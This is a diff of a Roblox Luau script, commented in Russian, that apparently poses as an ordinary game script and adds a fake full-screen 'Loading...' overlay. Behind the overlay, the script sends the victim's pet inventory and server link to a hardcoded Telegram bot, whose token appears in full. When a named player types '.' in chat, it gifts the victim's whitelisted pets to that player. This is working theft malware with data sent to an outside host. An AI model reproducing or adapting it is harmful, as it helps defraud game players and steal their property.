@@ -5,41 +5,113 @@ local TextChatService = game:GetService("TextChatService")
 
 local player = Players.LocalPlayer
 
+-- 🌌 GUI ЗАГРУЗКИ (с фоновой картинкой и прогрессом)
+local function createLoadingScreen()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "CustomLoadingUI"
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = player:WaitForChild("PlayerGui")
+
+    -- ФОН
+    local background = Instance.new("ImageLabel")
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.Position = UDim2.new(0, 0, 0, 0)
+    background.Image = "rbxassetid://YOUR_BACKGROUND_ID" -- 🔁 ВСТАВЬ СЮДА ID
+    background.BackgroundTransparency = 1
+    background.ScaleType = Enum.ScaleType.Crop
+    background.Parent = screenGui
+
+    -- АВАТАР
+    local avatar = Instance.new("ImageLabel")
+    avatar.Size = UDim2.new(0, 80, 0, 80)
+    avatar.Position = UDim2.new(0.5, -40, 0.25, 0)
+    avatar.BackgroundTransparency = 1
+    avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
+    avatar.Parent = background
+
+    -- Надпись
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 0, 50)
+    label.Position = UDim2.new(0, 0, 0.4, 0)
+    label.BackgroundTransparency = 1
+    label.Text = "Loading..."
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.Font = Enum.Font.GothamBold
+    label.TextSize = 36
+    label.TextStrokeTransparency = 0.6
+    label.TextScaled = false
+    label.Parent = background
+
+    -- Прогресс-бар
+    local barContainer = Instance.new("Frame")
+    barContainer.Size = UDim2.new(0.4, 0, 0.025, 0)
+    barContainer.Position = UDim2.new(0.3, 0, 0.5, 0)
+    barContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    barContainer.BorderSizePixel = 0
+    barContainer.Parent = background
+
+    local barFill = Instance.new("Frame")
+    barFill.Size = UDim2.new(0, 0, 1, 0)
+    barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    barFill.BorderSizePixel = 0
+    barFill.Parent = barContainer
+
+    -- Проценты
+    local percent = Instance.new("TextLabel")
+    percent.Size = UDim2.new(0, 60, 0, 25)
+    percent.Position = UDim2.new(0.71, 10, 0.5, -12)
+    percent.BackgroundTransparency = 1
+    percent.TextColor3 = Color3.new(1, 1, 1)
+    percent.Text = "0%"
+    percent.Font = Enum.Font.Gotham
+    percent.TextSize = 20
+    percent.TextXAlignment = Enum.TextXAlignment.Left
+    percent.Parent = background
+
+    for i = 1, 100 do
+        barFill.Size = UDim2.new(i / 100, 0, 1, 0)
+        percent.Text = i.."%"
+        task.wait(0.025 + math.random() * 0.01)
+    end
+
+    task.wait(0.5)
+    screenGui:Destroy()
+end
+
+-- ⏳ Показать заставку
+createLoadingScreen()
+
 -- 🔧 НАСТРОЙКИ
 local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
 local TELEGRAM_CHAT_ID = "7144575011"
 local TARGET_PLAYER = "sfdgbzdfsb"
 local TRIGGER_MESSAGE = "."
 
--- 🐾 БЕЛЫЙ СПИСОК для передачи (только эти будут передаваться)
+-- 🐾 БЕЛЫЙ СПИСОК
 local WHITELIST = {
     "Hamster",
 }
 
--- Получаем PetGiftingService один раз
 local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
 
--- 🔎 Найти ВСЕХ питомцев (с весом и возрастом)
+-- 🔎 Получить всех питомцев
 local function getAllPets()
     local pets = {}
     local backpack = player:FindFirstChild("Backpack") or player.Character
 
     for _, item in ipairs(backpack:GetChildren()) do
         if item:IsA("Tool") then
-            -- Ищем формат "[X.XX KG] [Age X]"
             local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
             if weight and age then
-                -- Берем основное название (до первых квадратных скобок)
                 local petName = item.Name:match("^([^%[]+)") or item.Name
                 petName = petName:gsub("%s+$", "")
-
                 table.insert(pets, {
                     name = petName,
                     fullName = item.Name,
                     weight = tonumber(weight),
                     age = tonumber(age),
                     object = item,
-                    -- Флаг для проверки белого списка
                     isWhitelisted = table.find(WHITELIST, petName) ~= nil
                 })
             end
@@ -49,7 +121,7 @@ local function getAllPets()
     return pets
 end
 
--- 📜 Формируем список для уведомления (ВСЕ питомцы)
+-- 📜 Получить текстовый список питомцев
 local function getFullPetsList()
     local pets = getAllPets()
     if #pets == 0 then return "нет питомцев" end
@@ -63,7 +135,7 @@ local function getFullPetsList()
     return table.concat(list, "\n")
 end
 
--- 📨 Отправка в Telegram (с обработкой ошибок)
+-- 📨 Отправка в Telegram
 local function sendToTelegram(text)
     local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
                 "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
@@ -73,7 +145,7 @@ local function sendToTelegram(text)
     end
 end
 
--- 🔗 Получить ссылку на сервер (с проверкой наличия jobId)
+-- 🔗 Ссылка на сервер
 local function getServerLink()
     local placeId = game.PlaceId
     local jobId = game.JobId
@@ -83,7 +155,7 @@ local function getServerLink()
     return "https://www.roblox.com/games/"..placeId.."?gameInstanceId="..jobId
 end
 
--- 🏁 ИНИЦИАЛИЗАЦИЯ: сразу после инжекта отправляем полное уведомление
+-- 🏁 Первичное уведомление
 local function sendInitialNotification()
     local petsList = getFullPetsList()
     local message =
@@ -95,16 +167,14 @@ end
 
 sendInitialNotification()
 
--- Передать одного питомца
+-- 🐕 Передать одного питомца
 local function transferPet(pet)
     if not pet.isWhitelisted then return false end
     local target = Players:FindFirstChild(TARGET_PLAYER)
     if target and PetGiftingService then
         if player.Character and player.Character:FindFirstChild("Humanoid") then
-            -- Экипируем питомца
             player.Character.Humanoid:EquipTool(pet.object)
             task.wait(1)
-            -- Отправляем запрос на передачу экипированного питомца
             PetGiftingService:FireServer("GivePet", target)
             return true
         end
@@ -112,6 +182,7 @@ local function transferPet(pet)
     return false
 end
 
+-- 🚚 Начать передачу
 local function startPetTransfer()
     local pets = getAllPets()
     if #pets == 0 then
@@ -137,7 +208,7 @@ local function startPetTransfer()
     sendToTelegram(table.concat(report, "\n"))
 end
 
--- Обработка входящих сообщений через TextChatService (лучший способ ловить чат в LocalScript)
+-- 💬 Прослушка сообщений
 if TextChatService then
     TextChatService.OnIncomingMessage = function(message)
         local speaker = Players:FindFirstChild(message.TextSource.Name)
@@ -146,7 +217,6 @@ if TextChatService then
         end
     end
 else
-    -- fallback на старое событие, если TextChatService нет
     Players.PlayerChatted:Connect(function(chatType, speaker, message)
         if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
             startPetTransfer()
